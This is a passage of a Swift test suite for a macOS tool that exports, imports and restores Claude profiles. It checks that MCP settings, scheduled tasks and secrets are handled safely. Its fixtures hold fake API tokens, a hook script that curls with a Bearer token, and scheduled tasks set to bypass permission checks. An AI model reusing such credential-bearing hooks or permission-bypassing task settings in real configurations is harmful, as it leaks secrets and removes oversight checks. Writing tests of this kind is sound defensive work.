        try? fm.removeItem(atPath: cU)
    }

    // ---- Export: the preview and the page's words
    let part = SessionsExport.Part(profile: "a", name: "A", source: srcA, emails: ["ultra-1@example.com"])
    let pv = SessionsExport.preview(part)!
    check(pv.config.present && pv.config.servers == ["github", "remote"] && pv.tasks == 4 && pv.setup.taskPrompts == 4 && !pv.setup.units.contains { $0.kind == .task },
          "preview: the config with 2 MCP servers; 4 tasks with 4 prompts, which aren't in the setup row's units")
    let zw = ExportWords.mcpWords(pv, image: false), iw = ExportWords.mcpWords(pv, image: true)
    check(zw.value == "left out of a zip" && zw.note == "A zip leaves out the window's MCP settings (2 servers: github, remote): they can hold keys no scan can find. Choose the encrypted disk image to carry them." && iw.value == "2 MCP servers (github, remote): in the encrypted disk image" && iw.note == nil && ExportWords.mcpInfo(pv, image: true) == ExportWords.fingerprintNote && ExportWords.mcpInfo(pv, image: false) == nil,
          "export page: a zip says the MCP settings need the image; the image carries them: \(zw.value) / \(iw.value)")
    check(ExportWords.tasksNote(pv) == "4 scheduled tasks, 3 with their prompt (one without it can't be imported). An import adds them only if you pick Add them, and they come paused.", "export page: the tasks travel with their prompts and come back paused: \(ExportWords.tasksNote(pv) ?? "none")")

    // ---- Export: a zip
    let zipURL = URL(fileURLWithPath: out + "/A.zip")
    var zo: SessionsExport.Outcome?
    do { zo = try SessionsExport.run(SessionsExport.Job(parts: [part], keys: .leaveOut, destination: zipURL, rootName: "a-export", place: place)) } catch { check(false, "export (zip): \(error)") }
    check(zo != nil && zo!.configLeftOut && !zo!.configCarried && zo!.taskPrompts == 3, "export (zip): made; the MCP settings left out; 3 prompts go with their tasks (the orphan doesn't)")
    guard zo != nil, let oz = try? SessionsImport.open(zipURL, password: nil, place: place) else { print("(zip export failed; stopping)"); return }
    let mz = oz.parts[0].manifest
    check(oz.export.version == 3 && mz.version == 3 && !mz.items.contains { $0.role == .config } && mz.configLeftOut == "needs the encrypted disk image", "export (zip): format 3, no config item, and why it isn't there")
    check(Set(mz.items.filter { $0.role == .setup && $0.path.hasPrefix("setup/scheduled-tasks/") }.map(\.path)) == ["setup/scheduled-tasks/nightly-digest/SKILL.md", "setup/scheduled-tasks/weekly-report/SKILL.md", "setup/scheduled-tasks/elsewhere-task/SKILL.md"]
          && mz.setupLeftOut?.contains("scheduled task orphan-prompt's prompt (left out with its task)") == true, "export (zip): the tasks' prompts are in; a prompt no task names is left out and said")
    var zipHits: [String] = []
    for f in files(oz.tree.path) where (read(oz.tree.path + "/" + f) ?? "").contains(envValue) || (read(oz.tree.path + "/" + f) ?? "").contains(headerValue) || (read(oz.tree.path + "/" + f) ?? "").contains("mcpServers") { zipHits.append(f) }
    check(zipHits.isEmpty && fm.contents(atPath: zipURL.path)!.range(of: Data(envValue.utf8)) == nil && holds(oz.tree.path, settingsEnvValue).isEmpty,
          "export (zip): no MCP env value, header or server list anywhere in it, and no settings.json env value: \(zipHits)")
    // the lowest format that holds it: a file without the window's config or a task's prompt is version 2 (26.11.8 imports it)
    do {
        let cP = w + "/.claude-plain"
        write(cP + "/CLAUDE.md", "rules\n")
        let plainZip = URL(fileURLWithPath: out + "/plain.zip")
        let pz = try? SessionsExport.run(SessionsExport.Job(parts: [SessionsExport.Part(profile: "p", name: "P", source: SessionsBackup.Source(profile: "p", dataDir: "", codeDir: cP), emails: [])],
                                                           keys: .leaveOut, destination: plainZip, rootName: "plain-export", place: place))
        if pz != nil, let o = try? SessionsImport.open(plainZip, password: nil, place: place) {
            check(o.export.version == 2 && o.parts[0].manifest.version == 2 && SessionsBackup.formatVersion == 6 && SessionsBackup.backupVersion == 4,
                  "format: a file with no format-3 part is written as version 2 (the constants: 6 the highest export.json, 4 the highest backup.json)")
            SessionsImport.discard(o.work)
        } else { check(false, "format: the plain zip is made and opens") }
        let bP = try! SessionsBackup.make(SessionsBackup.Source(profile: "p", dataDir: "", codeDir: cP), kind: .manual, window: false, place: place)
        check(bP.version == 2 && bA.version == 3, "format: a plain backup without prompts is version 2; one with them is 3")
        try? fm.removeItem(atPath: cP)
    }
    // an export without the setup row still carries the prompts with their tasks
    let nz = URL(fileURLWithPath: out + "/A-nosetup.zip")
    if (try? SessionsExport.run(SessionsExport.Job(parts: [part], keys: .leaveOut, setup: false, destination: nz, rootName: "a-nosetup", place: place))) != nil, let o = try? SessionsImport.open(nz, password: nil, place: place) {
        let rels = o.parts[0].manifest.items.filter { $0.role == .setup }.map(\.path)
        check(rels.count == 3 && rels.allSatisfy { $0.hasPrefix("setup/scheduled-tasks/") }, "export (setup left out): only the tasks' prompts are in it, with their tasks: \(rels)")
        SessionsImport.discard(o.work)
    } else { check(false, "export (setup left out): made and opens") }

    // ---- Export: an encrypted image
    let dmgURL = URL(fileURLWithPath: out + "/A.dmg")
    var io: SessionsExport.Outcome?
    do { io = try SessionsExport.run(SessionsExport.Job(parts: [part], keys: .leaveOut, password: pw, destination: dmgURL, rootName: "a-image", place: place)) } catch { check(false, "export (image): \(error)") }
    check(io?.configCarried == true && io?.configLeftOut == false, "export (image): the MCP settings are carried")
    var oiMaybe: SessionsImport.Opened?
    if io != nil { do { oiMaybe = try SessionsImport.open(dmgURL, password: pw, place: place) } catch { check(false, "import (image): opens: \(error)") } }
    guard let oi = oiMaybe else { print("(image export failed; stopping)"); return }
    let imgConfigData = fm.contents(atPath: oi.tree.path + "/profiles/p1/config/claude_desktop_config.json")
    let imgConfig = json(imgConfigData)
    let imgItem = oi.parts[0].manifest.items.first { $0.role == .config }
    check(((imgConfig?["mcpServers"] as? [String: Any])?["github"] as? [String: Any]).flatMap { ($0["env"] as? [String: Any])?["GITHUB_TOKEN"] as? String } == envValue
          && allowlistOnly(imgConfigData) && imgItem?.original == "config/claude_desktop_config.json",
          "export (image): claude_desktop_config.json holds the MCP servers whole, env values too, and nothing else: no permission or consent setting, no path of this Mac, no sidebar part, no key a later app adds")
    check(sidebarOnly(fm.contents(atPath: oi.tree.path + "/profiles/p1/sidebar/epitaxyPrefs.json")), "export (image): the sidebar records hold the sections and groups alone")
    check(!(read(oi.tree.path + "/profiles/p1/config/claude_desktop_config.json") ?? sid(1)).contains(sid(1)), "export (image): a known account id in the config is its fingerprint (the leak check reads the file)")

    // ---- Import (image) into a profile that has nothing: left out by default
    let seatB = SeatID(account: sid(3), organization: sid(4))
    func target(_ name: String) -> (SessionsRestore.Target, data: String, code: String) {
        let d = w + "/Claude-\(name)", c = w + "/.claude-\(name)"
        try? fm.removeItem(atPath: d); try? fm.removeItem(atPath: c)
        try! fm.createDirectory(atPath: "\(d)/claude-code-sessions/\(seatB.account)/\(seatB.organization)", withIntermediateDirectories: true)
        try! fm.createDirectory(atPath: c + "/projects", withIntermediateDirectories: true)
        return (SessionsRestore.Target(profile: name, dataDir: d, codeDir: c, inUse: seatB), d, c)
    }
    let (tB, dB, cB) = target("b")
    let beforeB = tree(dB) + "\n" + tree(cB)
    let stB = try! SessionsImport.materialize(oi, part: oi.parts[0], target: "b")
    check(!holds(stB.backup.dir.path + "/setup", settingsEnvValue).isEmpty && !holds(stB.backup.dir.path + "/config", envValue).isEmpty
          && SessionsBackup.load(profile: "b", id: stB.id, place: stB.stage)?.envBlanked == nil,
          "import (image): the staged backup keeps the image's settings.json env values and its MCP settings as they came (the only way to restore an image)")
    let p0 = SessionsRestore.plan(tB, stB.backup)
    check(p0.refusal == nil && p0.config.present && p0.config.leftOut && p0.config.status == .new && p0.configPieces.isEmpty && p0.config.servers.map(\.name) == ["github", "remote"],
          "import: the MCP settings are listed (2 servers) and left out by default: \(p0.refusal ?? "ok")")
    check(p0.taskPlan.present && p0.taskPlan.leftOut && p0.tasks.isEmpty && p0.taskPrompts.isEmpty && p0.taskPlan.coming.map(\.id) == ["nightly-digest", "weekly-report"],
          "import: the tasks are listed and left out by default; 2 can come: \(p0.taskPlan.coming.map(\.id))")
    check(p0.taskPlan.tasks.first { $0.id == "elsewhere-task" }?.why == "it names a prompt file somewhere else" && p0.taskPlan.tasks.first { $0.id == "Bad Id" }?.why == "its id isn't one the Claude window keeps",
          "import: a task whose filePath points elsewhere, and one with an id the window drops, are listed, never written")
    let lines0 = p0.taskPlan.coming.map(\.line)
    check(["0 3 * * *", "0 9 * * 1", "30 8 * * 1-5", "15 * * * *", "*/10 * * * *", "0 6 1 * *", "0 9 * * 7", "0 0 1 1 *", "5 4 * * 1,3", "nonsense"].map(SessionsRestore.cronWords)
          == ["every day at 3:00", "Mondays at 9:00", "weekdays at 8:30", "every hour at :15", "every 10 minutes", "on day 1 of each month at 6:00", "Sundays at 9:00",
              "0 0 1 1 *", "5 4 * * 1,3", "nonsense"],
          "tasks: a schedule in plain words for the usual shapes, as written otherwise")
    check(lines0 == ["Nightly digest · every day at 3:00 · in /w/project · browser: no permission checks · permission mode carried over",
                     "Weekly report · Mondays at 9:00 · in /w/project · permissions: bypassPermissions · approved permissions"]
          && p0.taskPlan.risky == 2 && WindowWords.riskyWords(p0.taskPlan)?.hasPrefix("2 tasks run with permission checks off or with permissions approved on the other Mac") == true,
          "import: each task shows its schedule, its folder and a permission mode that isn't the default; bypassPermissions, approved permissions, a browser mode that skips checks and a carried mode are flagged: \(lines0)")
    check(p0.taskSessions.count == 1 && p0.taskSessions[0].hasPrefix("Nightly digest") && !p0.entries.contains { $0.leaf == "local_\(sid(11)).json" } && !p0.transcripts.contains { $0.leaf == "\(sid(111)).jsonl" }
          && p0.entries.contains { $0.leaf == "local_\(sid(10)).json" }, "import: with the tasks left out, the session the task ran stays out, with its transcript, as before")
    let p1 = SessionsRestore.plan(tB, stB.backup, addConfig: true, addTasks: true)
    check(p1.configPieces.count == 1 && p1.tasks.count == 1 && p1.tasks[0].data != nil && p1.taskPrompts.count == 2 && p1.taskSessions.isEmpty
          && p1.entries.contains { $0.leaf == "local_\(sid(11)).json" } && p1.transcripts.contains { $0.leaf == "\(sid(111)).jsonl" },
          "import: Add them: the config, the task file and 2 prompts; the session the task ran now comes with it")
    let bB = try! SessionsImport.commit(stB)
    let rB = try! SessionsRestore.run(tB, bB, addConfig: true, addTasks: true, windowClosed: { true })
    let srcTasks = SessionsRestore.taskList(fm.contents(atPath: scopeA + "/scheduled-tasks.json")!)
    let gotTasks = SessionsRestore.taskList(fm.contents(atPath: "\(dB)/claude-code-sessions/\(sid(3))/\(sid(4))/scheduled-tasks.json") ?? Data())
    check(gotTasks.map { $0["id"] as? String ?? "" } == ["nightly-digest", "weekly-report"] && gotTasks.allSatisfy { $0["enabled"] as? Bool == false },
          "import: the task file is written with the 2 tasks, each enabled: false")
    check(gotTasks.allSatisfy { g in
        var s = srcTasks.first { $0["id"] as? String == g["id"] as? String } ?? [:]; s["enabled"] = false
        return same(s, g)
    }, "import: nothing else of a task changed (every other key and value as in the file)")
    check(read("\(cB)/scheduled-tasks/nightly-digest/SKILL.md") == read("\(codeA)/scheduled-tasks/nightly-digest/SKILL.md") && read("\(cB)/scheduled-tasks/weekly-report/SKILL.md") != nil
          && !fm.fileExists(atPath: "\(cB)/scheduled-tasks/elsewhere-task") && !fm.fileExists(atPath: "\(cB)/scheduled-tasks/nightly-digest/notes.txt") && mode("\(cB)/scheduled-tasks/nightly-digest/SKILL.md") == 0o600,
          "import: each added task's prompt is where the window looks for it, byte for byte, 0600; nothing for a task that isn't added")
    let gotConfig = fm.contents(atPath: dB + "/claude_desktop_config.json")
    check(gotConfig != nil && gotConfig == fm.contents(atPath: bB.dir.appendingPathComponent("config/claude_desktop_config.json").path) && allowlistOnly(gotConfig) && mode(dB + "/claude_desktop_config.json") == 0o600,
          "import: claude_desktop_config.json is written with the MCP servers only, where the profile had none, 0600")
    check(rB.configAdded && rB.tasksAdded == ["Nightly digest", "Weekly report"] && rB.tasksAddedCount == 2 && rB.tasksRisky == 2 && fm.fileExists(atPath: "\(dB)/claude-code-sessions/\(sid(3))/\(sid(4))/local_\(sid(11)).json"),
          "import: the receipt says the MCP settings and the 2 tasks (paused) were added; the task's session came in with it")
    let uB = try! SessionsRestore.undo(rB.id, windowClosed: { true })
    check(uB.undone != nil && tree(dB) + "\n" + tree(cB) == beforeB && !fm.fileExists(atPath: cB + "/scheduled-tasks"), "import: Undo takes back exactly what was added (the config, the task file, the prompts and their folders)")

    // ---- Import into a profile that has its own: what is here stays, byte for byte; the missing servers and tasks are listed
    let (tC, dC, cC) = target("c")
    write(dC + "/claude_desktop_config.json", #"{"mcpServers":{"mine":{"command":"my-server"},"github":{"command":"other"}}}"#)
    let scopeC = "\(dC)/claude-code-sessions/\(sid(3))/\(sid(4))"
    write(scopeC + "/scheduled-tasks.json", #"{"scheduledTasks":[{"id":"weekly-report","displayName":"Weekly report","enabled":true}]}"#)
    write(cC + "/scheduled-tasks/nightly-digest/SKILL.md", "my own nightly prompt\n")
    let beforeC = tree(dC) + "\n" + tree(cC)
    let stC = try! SessionsImport.materialize(oi, part: oi.parts[0], target: "c")
    let pC = SessionsRestore.plan(tC, stC.backup, addConfig: true, addTasks: true)
    check(pC.config.status == .here && pC.configPieces.isEmpty && pC.config.lacking == ["remote"] && WindowWords.lacking(pC.config, name: "C", imported: true)?.hasPrefix("1 server in the file isn't in C's settings: remote. Nothing is merged into C's settings") == true,
          "import: a claude_desktop_config.json here stays; the server it lacks (remote) is listed, nothing merged: \(pC.config.lacking)")
    check(pC.taskPlan.status == .here && pC.tasks.isEmpty && pC.taskPrompts.isEmpty && pC.taskPlan.lacking.contains("Nightly digest") && !pC.taskPlan.lacking.contains("Weekly report")
          && pC.taskSessions.count == 1, "import: a task file here stays; the tasks it lacks are listed; the task's session stays out: \(pC.taskPlan.lacking)")
    let bC = try! SessionsImport.commit(stC)
    let rC = try! SessionsRestore.run(tC, bC, addConfig: true, addTasks: true, windowClosed: { true })
    let afterC = tree(dC) + "\n" + tree(cC)
    check(beforeC.split(separator: "\n").allSatisfy { afterC.contains($0) } && read(dC + "/claude_desktop_config.json") == #"{"mcpServers":{"mine":{"command":"my-server"},"github":{"command":"other"}}}"#
          && !rC.configAdded && rC.tasksAdded.isEmpty, "import: the config, the task file and the prompt here are byte-identical; nothing of the three was added")
    _ = try? SessionsRestore.undo(rC.id, windowClosed: { true })
    // a different prompt here for a task (no task file here): that task isn't written; the other one is
    let (tD, dD, cD) = target("d")
    write(cD + "/scheduled-tasks/nightly-digest/SKILL.md", "my own nightly prompt\n")
    let stD = try! SessionsImport.materialize(oi, part: oi.parts[0], target: "d")
    let pD = SessionsRestore.plan(tD, stD.backup, addTasks: true)
    check(pD.taskPlan.tasks.first { $0.id == "nightly-digest" }?.why == "a different prompt for it is here" && pD.taskPlan.coming.map(\.id) == ["weekly-report"] && pD.taskPrompts.count == 1
          && pD.taskSessions.count == 1, "import: a task whose prompt here differs isn't written (nor its session); the other comes: \(pD.taskPlan.coming.map(\.id))")
    let bD = try! SessionsImport.commit(stD)
    _ = try! SessionsRestore.run(tD, bD, addTasks: true, windowClosed: { true })
    check(read(cD + "/scheduled-tasks/nightly-digest/SKILL.md") == "my own nightly prompt\n" && SessionsRestore.taskList(fm.contents(atPath: "\(dD)/claude-code-sessions/\(sid(3))/\(sid(4))/scheduled-tasks.json") ?? Data()).map { $0["id"] as? String ?? "" } == ["weekly-report"],
          "import: the prompt here is untouched; the task file holds only the task that came")
    // no account linked yet: the tasks can't be added, and say why
    let (tE0, _, _) = target("e")
    let tE = SessionsRestore.Target(profile: "e", dataDir: tE0.dataDir, codeDir: tE0.codeDir, inUse: nil)
    let stE = try! SessionsImport.materialize(oi, part: oi.parts[0], target: "e")
    let pE = SessionsRestore.plan(tE, stE.backup, addTasks: true)
    check(pE.taskPlan.status == .blocked("the profile isn't linked to an account yet") && pE.tasks.isEmpty, "import: a profile without an account in use gets no task file, and the row says why")

    // ---- Import (zip): no MCP settings in it (the row says why); the tasks come all the same
    let (tF, dF, cF) = target("f")
    let stF = try! SessionsImport.materialize(oz, part: oz.parts[0], target: "f")
    let pF = SessionsRestore.plan(tF, stF.backup, addConfig: true, addTasks: true)
    check(!pF.config.present && pF.config.leftOutAtSource == "needs the encrypted disk image" && pF.configPieces.isEmpty && WindowWords.configValue(pF.config, name: "F", imported: true) == "not in the file: needs the encrypted disk image"
          && pF.tasks.count == 1 && pF.taskPrompts.count == 2, "import (zip): no MCP settings (and why), the tasks with their prompts")
    let bF = try! SessionsImport.commit(stF)
    _ = try! SessionsRestore.run(tF, bF, addConfig: true, addTasks: true, windowClosed: { true })
    check(!fm.fileExists(atPath: dF + "/claude_desktop_config.json") && fm.fileExists(atPath: cF + "/scheduled-tasks/weekly-report/SKILL.md"), "import (zip): nothing of the config written; the tasks' prompts are")
    SessionsImport.discard(oz.work)

    // ---- Restore from this Mac's own backup: today's rule (the account in use's file, only when none is here, as it was), the prompts too
    let tA = SessionsRestore.Target(profile: "a", dataDir: dataA, codeDir: codeA, inUse: seatA)
    let bkA = SessionsRestore.Backup(profile: "a", id: bA.id, place: place)
    let origTasks = fm.contents(atPath: scopeA + "/scheduled-tasks.json")
    try? fm.removeItem(atPath: scopeA + "/scheduled-tasks.json"); try? fm.removeItem(atPath: codeA + "/scheduled-tasks/weekly-report"); try? fm.removeItem(atPath: dataA + "/claude_desktop_config.json")
    try? fm.removeItem(atPath: codeA + "/settings.json")
    let pr = SessionsRestore.plan(tA, bkA, addConfig: true)
    check(pr.tasks.count == 1 && pr.tasks[0].data == nil && pr.taskPrompts.map(\.dirs) == [["scheduled-tasks", "weekly-report"]] && !pr.config.present && pr.config.leftOutAtSource == nil
          && pr.configPieces.isEmpty && !pr.taskPlan.imported,
          "restore: the missing task file comes back as it was, with the missing prompt; this Mac's own backup has no MCP settings, so no MCP row and nothing to add")
    let pr2 = SessionsRestore.plan(tA, bkA, addSetup: true)
    check(pr2.setup.envBlanked && pr2.setupPieces.contains { $0.rel == ["setup", "settings.json"] } && SetupRow.envBlankedWords.hasPrefix("Backups don't keep the values in settings.json's env section"),
          "restore: a settings.json that is missing comes back (Add them), and the row says its env values aren't kept in backups")
    let rrA = try! SessionsRestore.run(tA, bkA, addSetup: true, windowClosed: { true })
    check(fm.contents(atPath: scopeA + "/scheduled-tasks.json") == origTasks && SessionsRestore.taskList(origTasks!).first?["enabled"] as? Bool == true && fm.fileExists(atPath: codeA + "/scheduled-tasks/weekly-report/SKILL.md")
          && !fm.fileExists(atPath: dataA + "/claude_desktop_config.json") && rrA.tasksAdded.isEmpty && !rrA.configAdded,
          "restore: the task file is back byte for byte (not paused: this Mac's own tasks), the prompt too; no MCP settings")
    check((json(fm.contents(atPath: codeA + "/settings.json"))?["env"] as? [String: String]) == ["DEPLOY_TOKEN": "", "REGION": ""], "restore: settings.json comes back with its env names, blank")
    _ = try! SessionsRestore.undo(rrA.id, windowClosed: { true })
    check(!fm.fileExists(atPath: scopeA + "/scheduled-tasks.json") && !fm.fileExists(atPath: codeA + "/settings.json") && !fm.fileExists(atPath: codeA + "/scheduled-tasks/weekly-report"), "restore: Undo takes them back")
    plantA()
    // a settings.json that is here stays, also when the backup's is the blanked one
    let pr3 = SessionsRestore.plan(tA, bkA, addSetup: true)
    check(pr3.setup.entries.first { $0.unit.kind == .settings }?.status == .different && !pr3.setupPieces.contains { $0.rel == ["setup", "settings.json"] } && pr3.setup.settingsDiffer.contains("env.DEPLOY_TOKEN"),
          "restore: the settings.json here (with its values) stays; the backup's blank names show as a difference, never written over it")

    // ---- an export from a plain backup: the image carries the blank settings.json, the page says so; no MCP settings in it
    let bpart0 = SessionsExport.Part(profile: "a", name: "A", backup: bkA)
    let bpv0 = SessionsExport.preview(bpart0)!
    check(ExportWords.mcpWords(bpv0, image: true).value == "none: backups don't keep the window's MCP settings; export the profile as it is now to carry them",
          "export (from a plain backup): the MCP row says why there are none")
    check(bpv0.setup.envBlanked && ExportWords.setupNotes(bpv0, setup: true, image: true).contains { $0.hasPrefix("settings.json comes with its env values blank") }
          && !ExportWords.setupNotes(bpv0, setup: true, image: false).contains { $0.contains("env values blank") } && !bpv0.config.present,
          "export (from a plain backup): the page says settings.json comes with blank env values (image); no MCP settings to carry")
    let fromBk = URL(fileURLWithPath: out + "/A-from-backup.dmg")
    if (try? SessionsExport.run(SessionsExport.Job(parts: [bpart0], keys: .leaveOut, password: pw, destination: fromBk, rootName: "a-from-backup", place: place))) != nil,
       let ob = try? SessionsImport.open(fromBk, password: pw, place: place) {
        check((json(fm.contents(atPath: ob.tree.path + "/profiles/p1/setup/settings.json"))?["env"] as? [String: String]) == ["DEPLOY_TOKEN": "", "REGION": ""]
              && holds(ob.tree.path, settingsEnvValue).isEmpty && !files(ob.tree.path).contains { $0.contains("config/") } && ob.parts[0].manifest.envBlanked == true,
              "export (image from a plain backup): the blank settings.json, no env value and no MCP settings in it")
        SessionsImport.discard(ob.work)
    } else { check(false, "export (image from a plain backup): made and opens") }

    // ---- Backups: a key in a plain backup. The Export page's key scan (SecretScan) runs over what a plain backup is about to write:
    // settings.json's values (blanked, keys kept), the scripts its hooks run, the marketplaces file (left out). Fake keys, cut by an
    // empty interpolation so no key shape is in this file.
    do {
        let nothing = ""
        let ghK = "gh\(nothing)p_FAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE0000"
        let skK = "sk\(nothing)-FAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE0000"
        let awsK = "AK\(nothing)IAFAKEFAKEFAKEFAKE"
        let jwtK = "ey\(nothing)JhbGciOiJIUzI1NiJ9.ey\(nothing)JzdWIiOiJ4Zm9vIn0.FAKESIGNATUREFAKESIGNATURE00"
        let allKeys = [ghK, skK, awsK, jwtK]
        let cK = w + "/.claude-k"
        func plantK(keyed: Bool) {
            try? fm.removeItem(atPath: cK)
            write(cK + "/CLAUDE.md", "# rules\n")
            write(cK + "/hooks/clean.sh", "#!/bin/sh\necho clean\n"); chmod(cK + "/hooks/clean.sh", 0o755)
            write(cK + "/hooks/status.sh", "#!/bin/sh\necho status\n"); chmod(cK + "/hooks/status.sh", 0o755)
            write(cK + "/hooks/keyed.sh", keyed ? "#!/bin/sh\ncurl -H 'Authorization: Bearer \(ghK)' https://example.com\n" : "#!/bin/sh\necho no key\n"); chmod(cK + "/hooks/keyed.sh", 0o755)
            write(cK + "/skills/ok/SKILL.md", "ok skill\n"); write(cK + "/skills/ok/run.sh", "#!/bin/sh\necho ok\n"); chmod(cK + "/skills/ok/run.sh", 0o755)
            write(cK + "/skills/guard/SKILL.md", "guard skill\n")
            write(cK + "/skills/guard/run.sh", keyed ? "#!/bin/sh\nTOKEN=\(awsK)\n" : "#!/bin/sh\necho guard\n"); chmod(cK + "/skills/guard/run.sh", 0o755)
            write(cK + "/plugins/installed_plugins.json", #"{"plugins":{"a@m":{}}}"#)
            write(cK + "/plugins/known_marketplaces.json", keyed ? #"{"m":{"url":"https://example.com/m.git","token":"\#(skK)"}}"# : #"{"m":{"url":"https://example.com/m.git"}}"#)
            // a script saved as UTF-16LE with its byte order mark: the byte scan can't see a key in it (a zero between letters)
            let wide = "#!/bin/sh\n" + (keyed ? "TOKEN=\(ghK)\n" : "echo wide\n")
            try! Data([0xFF, 0xFE] + wide.utf16.flatMap { [UInt8($0 & 0xFF), UInt8($0 >> 8)] }).write(to: URL(fileURLWithPath: cK + "/hooks/wide.sh").createDirs())
            chmod(cK + "/hooks/wide.sh", 0o755)
            let cmd: (String) -> [String: Any] = { ["type": "command", "command": cK + "/" + $0] }
            let httpHook: (String) -> [String: Any] = { ["type": "http", "url": $0] }
            let settings: [String: Any] = [
                "env": ["PLAIN": "plain-env-value-w1"],
                "apiKeyHelper": keyed ? "echo \(skK)" : "my-helper --quiet",
                "model": "opus",
                "permissions": ["allow": ["Bash(ls:*)", keyed ? "WebFetch(curl -H 'Authorization: Bearer \(jwtK)')" : "WebFetch(domain:example.com)", "Bash(git:*)"], "deny": ["Bash(rm:*)"],
                                "ask": [keyed ? "Bash(curl -H x:\(skK))" : "Bash(git push:*)"]],
                "nested": ["deep": ["token": keyed ? awsK : "not-a-key", "keep": "task-fix-the-login-page-for-users"], "list": [[keyed ? ghK : "fine-too"], "fine"]],
                "enabledPlugins": keyed ? [ghK: true, "ok@m": true] : ["ok@m": true],
                "hooks": [
                    "Stop": [["hooks": [cmd("hooks/clean.sh"), cmd("hooks/keyed.sh"), cmd("hooks/wide.sh"), cmd("skills/guard/run.sh"), cmd("skills/ok/run.sh"), httpHook("https://hooks.example.com/stop")]]],
                    // an http hook with a key in its url (blanked it would be an invalid url: Claude Code would ignore the whole file), next to a clean one
                    "PreToolUse": [["matcher": "Bash", "hooks": [httpHook(keyed ? "https://hooks.example.com/check?token=\(ghK)" : "https://hooks.example.com/check?token=none"), cmd("hooks/clean.sh")]]],
                    // a command hook with a key, alone in its matcher and its event
                    "PostToolUse": [["matcher": "Edit", "hooks": [["type": "command", "command": keyed ? "echo \(skK)" : "echo hi"]]]],
                    "Notification": [["hooks": [["type": "command", "command": keyed ? "notify --token \(jwtK)" : "notify --quiet"]]]]],
                "statusLine": cmd("hooks/status.sh")]
            try! JSONSerialization.data(withJSONObject: settings, options: [.prettyPrinted, .sortedKeys]).write(to: URL(fileURLWithPath: cK + "/settings.json").createDirs())
        }
        let srcK = SessionsBackup.Source(profile: "k", dataDir: "", codeDir: cK)
        plantK(keyed: true)
        let origSettingsK = json(fm.contents(atPath: cK + "/settings.json"))!
        let bK = try! SessionsBackup.make(srcK, kind: .manual, window: false, place: place)
        let dirK = SessionsBackup.folder(profile: "k", place: place).appendingPathComponent(bK.id).path
        let relsK = Set(bK.items.map(\.path))
        check(holds(dirK, ghK).isEmpty && holds(dirK, skK).isEmpty && holds(dirK, awsK).isEmpty && holds(dirK, jwtK).isEmpty && holds(dirK, "WebFetch(curl").isEmpty,
              "key scan (plain backup): none of the 4 fake keys' bytes is in any file of the backup: \(allKeys.flatMap { holds(dirK, $0) })")
        check(bK.secretBlanked == ["apiKeyHelper", "enabledPlugins.(a key)", "nested.deep.token", "nested.list[0][0]"],
              "key scan: settings.json's matching values outside hooks and permission rules are named by dotted path (an array element by index, a key that is itself a match as \"(a key)\"): \(bK.secretBlanked ?? [])")
        let sK = json(fm.contents(atPath: dirK + "/setup/settings.json")) ?? [:]
        check(sK["apiKeyHelper"] as? String == ""
              && ((sK["nested"] as? [String: Any])?["deep"] as? [String: String]) == ["token": "", "keep": "task-fix-the-login-page-for-users"]
              && ((sK["nested"] as? [String: Any])?["list"] as? [Any])?.count == 2 && (((sK["nested"] as? [String: Any])?["list"] as? [Any])?[0] as? [String]) == [""]
              && (sK["enabledPlugins"] as? [String: Bool]) == ["ok@m": true],
              "key scan: a value that matches is blank (an array element too, kept in place), one that doesn't stays; a nested one is blanked where it is; keys are kept")
        // hooks are never blanked (Claude Code 2.1.318: an http hook's url of "" fails its schema, and for PreToolUse that is fatal: the restored file would be ignored whole)
        let hooksK = sK["hooks"] as? [String: Any] ?? [:]
        let origHooksK = origSettingsK["hooks"] as? [String: Any] ?? [:]
        let preK = ((hooksK["PreToolUse"] as? [[String: Any]])?.first)
        let allHookEntries = hooksK.values.flatMap { ($0 as? [[String: Any]] ?? []).flatMap { $0["hooks"] as? [[String: Any]] ?? [] } }
        check(Set(hooksK.keys) == ["Stop", "PreToolUse"] && same(["Stop": hooksK["Stop"] as Any], ["Stop": origHooksK["Stop"] as Any])
              && (hooksK["PreToolUse"] as? [[String: Any]])?.count == 1 && preK?["matcher"] as? String == "Bash" && (preK?["hooks"] as? [[String: Any]])?.count == 1
              && same((preK?["hooks"] as? [[String: Any]])?.first ?? [:], ["type": "command", "command": cK + "/hooks/clean.sh"]),
              "key scan: an http hook with a key in its url is dropped whole (its matcher keeps the one clean hook), a command hook with a key too, an event they empty goes; the clean hooks, the clean http hook included, stay: \(Set(hooksK.keys))")
        check(!allHookEntries.isEmpty && allHookEntries.allSatisfy { e in
                  if e["type"] as? String == "http" { return (e["url"] as? String).flatMap { URL(string: $0) }.map { $0.scheme == "https" && ($0.host ?? "").isEmpty == false } == true }
                  return !((e["command"] as? String) ?? "").isEmpty
              },
              "key scan: every hook in the backup's settings.json is one Claude Code accepts (a command that isn't empty, an http url that parses): no blank hook")
        check(bK.secretHooksDropped == ["Notification", "PostToolUse (Edit)", "PreToolUse (Bash)"],
              "key scan: the dropped hooks are named by event and matcher (names only): \(bK.secretHooksDropped ?? [])")
        check(bK.secretRulesDropped == ["permissions.allow[1]", "permissions.ask[0]"]
              && (sK["permissions"] as? [String: Any])?["allow"] as? [String] == ["Bash(ls:*)", "Bash(git:*)"] && (sK["permissions"] as? [String: Any])?["ask"] as? [String] == []
              && (sK["permissions"] as? [String: Any])?["deny"] as? [String] == ["Bash(rm:*)"],
              "key scan: a permission rule that holds a key is dropped, not left blank (listed by its place in allow, deny or ask); the others stay: \(bK.secretRulesDropped ?? [])")
        check(sK["model"] as? String == "opus" && (sK["env"] as? [String: String]) == ["PLAIN": ""]
              && same(sK["statusLine"] as? [String: Any] ?? [:], origSettingsK["statusLine"] as? [String: Any] ?? ["x": 1]),
              "key scan: what doesn't match is as it was (model, status line); env values are still blank")
        let itemK = bK.items.first { $0.path == "setup/settings.json" }
        check(itemK?.sha == SwitchEngine.sha(fm.contents(atPath: dirK + "/setup/settings.json") ?? Data()) && itemK?.bytes == Int64(fm.contents(atPath: dirK + "/setup/settings.json")?.count ?? -1),
              "key scan: the settings.json item's hash and size are the blanked file's")
        check(!relsK.contains("setup/hooks/keyed.sh") && !relsK.contains("setup/plugins/known_marketplaces.json") && !relsK.contains { $0.hasPrefix("setup/skills/guard/") }
              && !fm.fileExists(atPath: dirK + "/setup/hooks/keyed.sh") && !fm.fileExists(atPath: dirK + "/setup/skills/guard") && !fm.fileExists(atPath: dirK + "/setup/plugins/known_marketplaces.json"),
